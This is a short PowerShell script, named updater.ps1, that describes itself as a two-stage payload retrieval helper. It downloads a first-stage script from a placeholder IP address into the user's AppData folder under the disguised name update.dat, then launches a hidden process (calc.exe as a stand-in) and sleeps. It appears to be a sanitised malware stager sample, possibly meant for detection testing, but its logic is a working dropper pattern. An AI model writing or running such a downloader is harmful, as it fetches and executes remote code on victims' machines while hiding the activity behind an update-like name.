<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://192.0.2.100/stage1.ps1',
    [string]$PayloadPath = "$env:APPDATA\update.dat",
    [int]$RequestTimeout = 140
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$StageResult = Invoke-Stage1Download -SourceUrl $FetchUrl -DestinationPath $PayloadPath -TimeoutSec $RequestTimeout
if ($StageResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Start-Sleep -Seconds 34
